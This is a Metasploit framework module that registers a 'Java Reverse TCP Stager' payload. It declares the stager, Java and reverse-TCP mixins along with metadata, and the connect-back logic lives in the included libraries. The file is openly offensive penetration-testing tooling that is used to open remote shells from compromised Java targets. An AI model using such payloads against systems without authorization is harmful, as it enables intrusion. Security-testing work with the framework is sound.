##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 5256

  include Msf::Payload::Stager
  include Msf::Payload::Java
  include Msf::Payload::Java::ReverseTcp

  def initialize(info={})
    super(merge_info(info,
      'Name'        => 'Java Reverse TCP Stager',
      'Description' => 'Connect back stager',
      'Author'      => ['mihi', 'egypt'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'java',
      'Arch'        => ARCH_JAVA,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Convention'  => 'javasocket',
      'Stager'      => {'Payload' => ''}
    ))
  end
end
